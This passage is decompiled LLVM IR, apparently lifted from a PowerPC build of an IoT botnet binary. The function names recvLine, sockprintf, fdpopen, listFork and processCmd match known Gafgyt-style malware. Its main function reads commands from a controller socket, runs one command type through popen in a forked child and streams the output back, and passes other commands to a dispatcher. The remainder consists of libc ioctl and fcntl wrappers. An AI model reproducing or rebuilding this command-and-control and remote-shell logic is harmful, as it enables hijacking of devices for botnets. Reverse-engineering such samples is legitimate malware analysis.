  %v3_1000a4e0 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1001c240.814 to i32), i32 268566528)
  %tmp111 = icmp slt i32 %v1_1000a4c8, 21
  br i1 %tmp111, label %dec_label_pc_1000a0f4.outer, label %dec_label_pc_1000a4f0

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4c4
  %v0_1000a4f4 = call i32 @__GI_exit()
  br label %dec_label_pc_1000a4f8

dec_label_pc_1000a4f8:                            ; preds = %dec_label_pc_1000a4a0, %dec_label_pc_1000a4f0
  %stack_var_-5748.1 = phi i32 [ %v1_1000a4c8, %dec_label_pc_1000a4f0 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000a4a0 ]
  %v2_1000a504 = load i8, i8* %v4_1000a988, align 4
  %v3_1000a50c = icmp eq i8 %v2_1000a504, 33
  br i1 %v3_1000a50c, label %dec_label_pc_1000a530, label %dec_label_pc_1000a970.outer

dec_label_pc_1000a530:                            ; preds = %dec_label_pc_1000a4f8, %dec_label_pc_1000a544
  %storemerge = phi i32 [ %v1_1000a518, %dec_label_pc_1000a544 ], [ %v2_1000a978, %dec_label_pc_1000a4f8 ]
  %v1_1000a518 = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_1000a518 to i8*
  %v2_1000a534 = load i8, i8* %storemerge8, align 1
  %v3_1000a53c = icmp eq i8 %v2_1000a534, 32
  br i1 %v3_1000a53c, label %dec_label_pc_1000a558, label %dec_label_pc_1000a544

dec_label_pc_1000a544:                            ; preds = %dec_label_pc_1000a530
  %v2_1000a548 = load i8, i8* %storemerge8, align 1
  %v3_1000a550 = icmp eq i8 %v2_1000a548, 0
  br i1 %v3_1000a550, label %dec_label_pc_1000a558, label %dec_label_pc_1000a530

dec_label_pc_1000a558:                            ; preds = %dec_label_pc_1000a544, %dec_label_pc_1000a530
  %v2_1000a55c = load i8, i8* %storemerge8, align 1
  %v3_1000a564 = icmp eq i8 %v2_1000a55c, 0
  br i1 %v3_1000a564, label %dec_label_pc_1000a970.outer, label %dec_label_pc_1000a56c

dec_label_pc_1000a56c:                            ; preds = %dec_label_pc_1000a558
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_1000a57c, i32* @r3, align 4
  %v0_1000a58c = call i32 @__GI_strlen()
  %v2_1000a59c = add i32 %v0_1000a58c, %v2_1000a978
  %v1_1000a5a0 = add i32 %v2_1000a59c, 2
  %v2_1000a5ec = add i32 %v2_1000a59c, 1
  br label %dec_label_pc_1000a5d4

dec_label_pc_1000a5ac:                            ; preds = %dec_label_pc_1000a604, %dec_label_pc_1000a5d4
  store i32 %v1_1000a5a0, i32* @r3, align 4
  %v0_1000a5b4 = call i32 @__GI_strlen()
  %v1_1000a5c8 = add i32 %v0_1000a5b4, %v2_1000a5ec
  %v3_1000a5d0 = inttoptr i32 %v1_1000a5c8 to i8*
  store i8 0, i8* %v3_1000a5d0, align 1
  br label %dec_label_pc_1000a5d4

dec_label_pc_1000a5d4:                            ; preds = %dec_label_pc_1000a56c, %dec_label_pc_1000a5ac
  store i32 %v1_1000a5a0, i32* @r3, align 4
  %v0_1000a5dc = call i32 @__GI_strlen()
  %v1_1000a5f0 = add i32 %v0_1000a5dc, %v2_1000a5ec
  %v1_1000a5f4 = inttoptr i32 %v1_1000a5f0 to i8*
  %v2_1000a5f4 = load i8, i8* %v1_1000a5f4, align 1
  %v3_1000a5fc = icmp eq i8 %v2_1000a5f4, 10
  br i1 %v3_1000a5fc, label %dec_label_pc_1000a5ac, label %dec_label_pc_1000a604

dec_label_pc_1000a604:                            ; preds = %dec_label_pc_1000a5d4
  store i32 %v1_1000a5a0, i32* @r3, align 4
  %v0_1000a60c = call i32 @__GI_strlen()
  %v1_1000a620 = add i32 %v0_1000a60c, %v2_1000a5ec
  %v1_1000a624 = inttoptr i32 %v1_1000a620 to i8*
  %v2_1000a624 = load i8, i8* %v1_1000a624, align 1
  %v3_1000a62c = icmp eq i8 %v2_1000a624, 13
  br i1 %v3_1000a62c, label %dec_label_pc_1000a5ac, label %dec_label_pc_1000a64c.preheader

dec_label_pc_1000a64c.preheader:                  ; preds = %dec_label_pc_1000a604
  %stack_var_-5780.029 = inttoptr i32 %v1_1000a5a0 to i8*
  %v2_1000a65030 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000a65834 = icmp eq i8 %v2_1000a65030, 32
  br i1 %v3_1000a65834, label %dec_label_pc_1000a674, label %dec_label_pc_1000a660

dec_label_pc_1000a640:                            ; preds = %dec_label_pc_1000a660
  %v1_1000a644 = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_1000a644 to i8*
  %v2_1000a650 = load i8, i8* %stack_var_-5780.0, align 1
  %v3_1000a658 = icmp eq i8 %v2_1000a650, 32
  br i1 %v3_1000a658, label %dec_label_pc_1000a674, label %dec_label_pc_1000a660

dec_label_pc_1000a660:                            ; preds = %dec_label_pc_1000a64c.preheader, %dec_label_pc_1000a640
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_1000a640 ], [ %stack_var_-5780.029, %dec_label_pc_1000a64c.preheader ]
  %storemerge1935 = phi i32 [ %v1_1000a644, %dec_label_pc_1000a640 ], [ %v1_1000a5a0, %dec_label_pc_1000a64c.preheader ]
  %v2_1000a664 = load i8, i8* %stack_var_-5780.036, align 1
  %v3_1000a66c = icmp eq i8 %v2_1000a664, 0
  br i1 %v3_1000a66c, label %dec_label_pc_1000a674, label %dec_label_pc_1000a640

dec_label_pc_1000a674:                            ; preds = %dec_label_pc_1000a640, %dec_label_pc_1000a660, %dec_label_pc_1000a64c.preheader
  %storemerge19.lcssa = phi i32 [ %v1_1000a5a0, %dec_label_pc_1000a64c.preheader ], [ %v1_1000a644, %dec_label_pc_1000a640 ], [ %storemerge1935, %dec_label_pc_1000a660 ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_1000a64c.preheader ], [ %stack_var_-5780.0, %dec_label_pc_1000a640 ], [ %stack_var_-5780.036, %dec_label_pc_1000a660 ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_1000a684 = add i32 %storemerge19.lcssa, 1
  %v2_1000a6d041 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000a6d844 = icmp eq i8 %v2_1000a6d041, 0
  br i1 %v3_1000a6d844, label %dec_label_pc_1000a6e0, label %dec_label_pc_1000a698

dec_label_pc_1000a698:                            ; preds = %dec_label_pc_1000a674, %dec_label_pc_1000a698
  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_1000a698 ], [ %stack_var_-5780.029, %dec_label_pc_1000a674 ]
  %storemerge1445 = phi i32 [ %v1_1000a6c4, %dec_label_pc_1000a698 ], [ %v1_1000a5a0, %dec_label_pc_1000a674 ]
  %v3_1000a69c = load i8, i8* %storemerge746, align 1
  %v4_1000a69c = zext i8 %v3_1000a69c to i32
  store i32 268478128, i32* @lr, align 4
  %v3_1000a6ac = call i32 @__GI_toupper(i32 %v4_1000a69c, i32 %storemerge1445)
  %v1_1000a6bc = trunc i32 %v3_1000a6ac to i8
  store i8 %v1_1000a6bc, i8* %storemerge746, align 1
  %v1_1000a6c4 = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_1000a6c4 to i8*
  %v2_1000a6d0 = load i8, i8* %storemerge7, align 1
  %v3_1000a6d8 = icmp eq i8 %v2_1000a6d0, 0
  br i1 %v3_1000a6d8, label %dec_label_pc_1000a6e0, label %dec_label_pc_1000a698

dec_label_pc_1000a6e0:                            ; preds = %dec_label_pc_1000a698, %dec_label_pc_1000a674
  store i32 ptrtoint ([3 x i8]* @global_var_1001c254.815 to i32), i32* @r4, align 4
  %v4_1000a6f0 = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([3 x i8]* @global_var_1001c254.815 to i32))
  %v3_1000a6f8 = icmp eq i32 %v4_1000a6f0, 0
  br i1 %v3_1000a6f8, label %dec_label_pc_1000a700, label %dec_label_pc_1000a7ec

dec_label_pc_1000a700:                            ; preds = %dec_label_pc_1000a6e0
  store i32 268478212, i32* @lr, align 4
  %v0_1000a700 = call i32 @listFork()
  %v3_1000a708 = icmp eq i32 %v0_1000a700, 0
  br i1 %v3_1000a708, label %dec_label_pc_1000a710, label %dec_label_pc_1000a970.outer

dec_label_pc_1000a710:                            ; preds = %dec_label_pc_1000a700
  store i32 268478248, i32* @lr, align 4
  %v3_1000a724 = call i32 @__GI_memset(i32 %v2_1000a710, i32 0, i32 1024)
  %v4_1000a744 = call i32 @szprintf(i32 %v2_1000a710, i32 ptrtoint ([8 x i8]* @global_var_1001c258.816 to i32), i32 %v1_1000a684)
  store i32 268478304, i32* @lr, align 4
  %v3_1000a75c = call i32 @fdpopen(i32 %v2_1000a710, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1001c1f0.794, i32 0, i32 0))
  br label %dec_label_pc_1000a7bc

dec_label_pc_1000a76c:                            ; preds = %dec_label_pc_1000a7bc
  %v1_1000a774 = call i32 @trim(i32 %v2_1000a710)
  %v3_1000a77c = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 268478364, i32* @lr, align 4
  %v5_1000a798 = call i32 @sockprintf(i32 %v3_1000a77c, i32 ptrtoint ([3 x i8]* @global_var_1001c260.817 to i32), i32 %v2_1000a710)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7b4.818 to i32), i32* @lr, align 4
  %v3_1000a7b0 = call i32 @__GI_memset(i32 %v2_1000a710, i32 0, i32 1024)
  store i32 268478396, i32* @lr, align 4
  %v1_1000a7b8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000a7bc

dec_label_pc_1000a7bc:                            ; preds = %dec_label_pc_1000a710, %dec_label_pc_1000a76c
  %v3_1000a7cc = call i32 @fdgets(i32 %v2_1000a710, i32 1024, i32 %v3_1000a75c)
  %v3_1000a7d4 = icmp eq i32 %v3_1000a7cc, 0
  br i1 %v3_1000a7d4, label %dec_label_pc_1000a7dc, label %dec_label_pc_1000a76c

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a7bc
  %v1_1000a7e0 = call i32 @fdpclose(i32 %v3_1000a75c)
  %v0_1000a7e8 = call i32 @__GI_exit()
  br label %dec_label_pc_1000a7ec

dec_label_pc_1000a7ec:                            ; preds = %dec_label_pc_1000a6e0, %dec_label_pc_1000a7dc
  store i32 ptrtoint (i32* @global_var_1001c264.821 to i32), i32* @r4, align 4
  store i32 268478472, i32* @lr, align 4
  %v3_1000a804 = call i32 @__GI_strtok(i32 %v1_1000a684, i32 ptrtoint (i32* @global_var_1001c264.821 to i32), i32 268566528)
  store i32 %v1_1000a5a0, i32* %stack_var_-5472, align 4
  %v3_1000a8fc50 = icmp eq i32 %v3_1000a804, 0
  br i1 %v3_1000a8fc50, label %dec_label_pc_1000a904, label %dec_label_pc_1000a81c

dec_label_pc_1000a81c:                            ; preds = %dec_label_pc_1000a7ec, %dec_label_pc_1000a8e0
  %stack_var_-5808.053.in = phi i32 [ %v3_1000a8ec, %dec_label_pc_1000a8e0 ], [ %v3_1000a804, %dec_label_pc_1000a7ec ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_1000a8e0 ], [ 1, %dec_label_pc_1000a7ec ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_1000a820 = load i8, i8* %stack_var_-5808.053, align 1
  %v3_1000a828 = icmp eq i8 %v2_1000a820, 10
  br i1 %v3_1000a828, label %dec_label_pc_1000a8e0, label %dec_label_pc_1000a830

dec_label_pc_1000a830:                            ; preds = %dec_label_pc_1000a81c
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000a83c = call i32 @__GI_strlen()
  %v1_1000a844 = add i32 %v0_1000a83c, 1
  store i32 %v1_1000a844, i32* @r3, align 4
  store i32 268478544, i32* @lr, align 4
  %v0_1000a84c = call i32 @malloc()
  %v0_1000a858 = load i32, i32* @r29, align 4
  %v1_1000a858 = mul i32 %v0_1000a858, 4
  %v1_1000a864 = add i32 %v1_1000a858, %v2_1000a940
  %v2_1000a868 = inttoptr i32 %v1_1000a864 to i32*
  store i32 %v0_1000a84c, i32* %v2_1000a868, align 4
  %v1_1000a870 = mul i32 %stack_var_-5804.151, 4
  %v1_1000a87c = add i32 %v1_1000a870, %v2_1000a940
  %v1_1000a880 = inttoptr i32 %v1_1000a87c to i32*
  %v2_1000a880 = load i32, i32* %v1_1000a880, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000a88c = call i32 @__GI_strlen()
  %v1_1000a894 = add i32 %v0_1000a88c, 1
  store i32 268478636, i32* @lr, align 4
  %v3_1000a8a8 = call i32 @__GI_memset(i32 %v2_1000a880, i32 0, i32 %v1_1000a894)
  %v2_1000a8c0 = load i32, i32* %v1_1000a880, align 4
  %v4_1000a8d0 = call i32 @strcpy(i32 %v2_1000a8c0, i8* nonnull %stack_var_-5808.053)
  %v1_1000a8d8 = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_1000a8e0

dec_label_pc_1000a8e0:                            ; preds = %dec_label_pc_1000a81c, %dec_label_pc_1000a830
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_1000a81c ], [ %v1_1000a8d8, %dec_label_pc_1000a830 ]
  store i32 ptrtoint (i32* @global_var_1001c264.821 to i32), i32* @r4, align 4
  store i32 268478704, i32* @lr, align 4
  %v3_1000a8ec = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001c264.821 to i32), i32 268566528)
  %v3_1000a8fc = icmp eq i32 %v3_1000a8ec, 0
  br i1 %v3_1000a8fc, label %dec_label_pc_1000a904, label %dec_label_pc_1000a81c

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8e0, %dec_label_pc_1000a7ec
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_1000a7ec ], [ %stack_var_-5804.0, %dec_label_pc_1000a8e0 ]
  store i32 268478740, i32* @lr, align 4
  %v3_1000a910 = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_1000a970.outer, label %dec_label_pc_1000a934.lr.ph

dec_label_pc_1000a934.lr.ph:                      ; preds = %dec_label_pc_1000a904
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_1000a934

dec_label_pc_1000a934:                            ; preds = %dec_label_pc_1000a934.lr.ph, %dec_label_pc_1000a934
  %v3_1000a934 = phi i32 [ 1, %dec_label_pc_1000a934.lr.ph ], [ %v1_1000a958, %dec_label_pc_1000a934 ]
  %v1_1000a938 = mul i32 %v3_1000a934, 4
  %v1_1000a944 = add i32 %v2_1000a940, %v1_1000a938
  %v1_1000a948 = inttoptr i32 %v1_1000a944 to i32*
  %v2_1000a948 = load i32, i32* %v1_1000a948, align 4
  store i32 %v2_1000a948, i32* @r3, align 4
  store i32 268478804, i32* @lr, align 4
  %v0_1000a950 = call i32 @free()
  %v3_1000a954 = load i32, i32* %stack_var_-5816, align 4
  %v1_1000a958 = add i32 %v3_1000a954, 1
  store i32 %v1_1000a958, i32* %stack_var_-5816, align 4
  %v2_1000a968 = icmp slt i32 %v1_1000a958, %stack_var_-5804.1.lcssa
  br i1 %v2_1000a968, label %dec_label_pc_1000a934, label %dec_label_pc_1000a970.outer

dec_label_pc_1000a970.outer:                      ; preds = %dec_label_pc_1000a934, %dec_label_pc_1000a4f8, %dec_label_pc_1000a700, %dec_label_pc_1000a904, %dec_label_pc_1000a558, %dec_label_pc_1000a110
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_1000a110 ], [ %stack_var_-5748.1, %dec_label_pc_1000a558 ], [ %stack_var_-5748.1, %dec_label_pc_1000a904 ], [ %stack_var_-5748.1, %dec_label_pc_1000a700 ], [ %stack_var_-5748.1, %dec_label_pc_1000a4f8 ], [ %stack_var_-5748.1, %dec_label_pc_1000a934 ]
  br label %dec_label_pc_1000a970

dec_label_pc_1000a970:                            ; preds = %dec_label_pc_1000a970.outer, %dec_label_pc_1000a480
  %v3_1000a974 = load i32, i32* @global_var_1002e5e8.31, align 4
  %v5_1000a988 = call i32 @recvLine(i32 %v3_1000a974, i8* %v4_1000a988, i32 4096, i32 %v2_1000a978)
  %v4_1000a99c = icmp eq i32 %v5_1000a988, -1
  br i1 %v4_1000a99c, label %dec_label_pc_1000a0f4.outer, label %dec_label_pc_1000a3d0

; uselistorder directives
  uselistorder i32 %v5_1000a988, { 1, 0 }
  uselistorder i32 %v1_1000a958, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000a8ec, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1000a6c4, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_1000a684, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000a5a0, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000a518, { 1, 0 }
  uselistorder i32 %v1_1000a4c8, { 1, 2, 0 }
  uselistorder i32 %v2_1000a3fc, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_1000a304, { 1, 0 }
  uselistorder i32 %v0_1000a2e8, { 1, 0 }
  uselistorder i32 %v3_1000a29c, { 1, 0 }
  uselistorder i32 %v1_1000a1b4, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000a940, { 2, 1, 0 }
  uselistorder i32 %v2_1000a710, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_1000a988, { 1, 0 }
  uselistorder i32 %v2_1000a978, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_10009ff0, { 1, 0, 2 }
  uselistorder i32 %v2_10009f7c, { 1, 0, 2 }
  uselistorder i32 %v2_10009f54, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10009f1c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10009dbc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1001c264.821 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 63, 62, 61, 60, 59, 58, 57, 56, 55, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24 }
  uselistorder i32 ()* @listFork, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_1002e5f0.48, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @sockprintf, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_1001c1f0.794, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1001c1f0.794 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 18, 17, 16, 0, 15, 14, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1001c1d8.789 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000a970.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000a934, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a81c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a698, { 1, 0 }
  uselistorder label %dec_label_pc_1000a674, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a660, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a530, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a340, { 1, 0 }
  uselistorder label %dec_label_pc_1000a300, { 1, 0 }
  uselistorder label %dec_label_pc_1000a208, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a104, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0f4.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a0d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a038, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10009f18, { 1, 0 }
  uselistorder label %dec_label_pc_10009eb8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000a9b8 = icmp eq i32 %arg2, -2143521772
  %v2_1000a9cc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000a9cc, i32* %stack_var_-32, align 4
  br i1 %v4_1000a9b8, label %dec_label_pc_1000aa2c, label %dec_label_pc_1000a9ec

dec_label_pc_1000a9ec:                            ; preds = %entry
  %v3_1000a9ec = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000a9ec, label %dec_label_pc_1000aa04, label %dec_label_pc_1000a9f4

dec_label_pc_1000a9f4:                            ; preds = %dec_label_pc_1000a9ec
  %v3_1000a9f8 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000a9f8, label %dec_label_pc_1000aa20, label %dec_label_pc_1000aa4c

dec_label_pc_1000aa04:                            ; preds = %dec_label_pc_1000a9ec
  %v1_1000aa04 = xor i32 %arg2, -2143551488
  %v3_1000aa08 = icmp eq i32 %v1_1000aa04, 29717
  br i1 %v3_1000aa08, label %dec_label_pc_1000aa3c, label %dec_label_pc_1000aa10

dec_label_pc_1000aa10:                            ; preds = %dec_label_pc_1000aa04
  %v3_1000aa14 = icmp eq i32 %v1_1000aa04, 29718
  br i1 %v3_1000aa14, label %dec_label_pc_1000aa44, label %dec_label_pc_1000aa4c

dec_label_pc_1000aa20:                            ; preds = %dec_label_pc_1000a9f4
  store i32 ptrtoint (i32* @global_var_1000aa28.822 to i32), i32* @lr, align 4
  %v1_1000aa24 = inttoptr i32 %arg3 to i32*
  %v2_1000aa24 = call i32 @__GI_tcgetattr(i32* %v1_1000aa24)
  br label %dec_label_pc_1000aa34

dec_label_pc_1000aa2c:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000aa30

dec_label_pc_1000aa30:                            ; preds = %dec_label_pc_1000aa44, %dec_label_pc_1000aa3c, %dec_label_pc_1000aa2c
  store i32 268479028, i32* @lr, align 4
  %v0_1000aa30 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000aa34

dec_label_pc_1000aa34:                            ; preds = %dec_label_pc_1000aa20, %dec_label_pc_1000aa30
  %storemerge = phi i32 [ %v0_1000aa30, %dec_label_pc_1000aa30 ], [ %v2_1000aa24, %dec_label_pc_1000aa20 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000aa78

dec_label_pc_1000aa3c:                            ; preds = %dec_label_pc_1000aa04
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000aa30

dec_label_pc_1000aa44:                            ; preds = %dec_label_pc_1000aa10
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000aa30

dec_label_pc_1000aa4c:                            ; preds = %dec_label_pc_1000aa10, %dec_label_pc_1000a9f4
  %v0_1000aa5c = call i32 @__asm_mfcr()
  %v1_1000aa60 = and i32 %v0_1000aa5c, 268435456
  %v3_1000aa60 = icmp eq i32 %v1_1000aa60, 0
  store i32 %v0_1000aa5c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aa60, label %dec_label_pc_1000aa78, label %dec_label_pc_1000aa6c

dec_label_pc_1000aa6c:                            ; preds = %dec_label_pc_1000aa4c
  %v0_1000aa6c = call i32 @__errno_location()
  %v0_1000aa70 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aa70 = inttoptr i32 %v0_1000aa6c to i32*
  store i32 %v0_1000aa70, i32* %v2_1000aa70, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000aa78

dec_label_pc_1000aa78:                            ; preds = %dec_label_pc_1000aa4c, %dec_label_pc_1000aa34, %dec_label_pc_1000aa6c
  %v0_1000aa7c = phi i32 [ %v0_1000aa5c, %dec_label_pc_1000aa4c ], [ %storemerge, %dec_label_pc_1000aa34 ], [ -1, %dec_label_pc_1000aa6c ]
  ret i32 %v0_1000aa7c

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000aa78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000aa34, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000aa98 = load i32, i32* @lr, align 4
  %v1_1000aa98 = load i1, i1* @cr0_so, align 1
  %v2_1000aa98 = xor i1 %v1_1000aa98, true
  call void @__pseudo_cond_branch(i1 %v2_1000aa98, i32 %v0_1000aa98)
  %v0_1000aa9c = call i32 @__syscall_error()
  ret i32 %v0_1000aa9c
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000aab4 = add i32 %arg2, -12
  %v2_1000aab8 = icmp ugt i32 %v1_1000aab4, 2
  %v2_1000aac0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000aac0, i32* %stack_var_-32, align 4
  br i1 %v2_1000aab8, label %dec_label_pc_1000aaec, label %dec_label_pc_1000aadc

dec_label_pc_1000aadc:                            ; preds = %entry
  store i32 268479204, i32* @lr, align 4
  %v2_1000aae0 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000aae0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ab0c

dec_label_pc_1000aaec:                            ; preds = %entry
  %v0_1000aaf0 = call i32 @__asm_mfcr()
  %v1_1000aaf4 = and i32 %v0_1000aaf0, 268435456
  %v3_1000aaf4 = icmp eq i32 %v1_1000aaf4, 0
  store i32 %v0_1000aaf0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000aaf4, label %dec_label_pc_1000ab0c, label %dec_label_pc_1000ab00

dec_label_pc_1000ab00:                            ; preds = %dec_label_pc_1000aaec
  %v0_1000ab00 = call i32 @__errno_location()
  %v0_1000ab04 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab04 = inttoptr i32 %v0_1000ab00 to i32*
  store i32 %v0_1000ab04, i32* %v2_1000ab04, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ab0c

dec_label_pc_1000ab0c:                            ; preds = %dec_label_pc_1000aaec, %dec_label_pc_1000aadc, %dec_label_pc_1000ab00
  %v0_1000ab10 = phi i32 [ %v0_1000aaf0, %dec_label_pc_1000aaec ], [ %v2_1000aae0, %dec_label_pc_1000aadc ], [ -1, %dec_label_pc_1000ab00 ]
  ret i32 %v0_1000ab10

; uselistorder directives
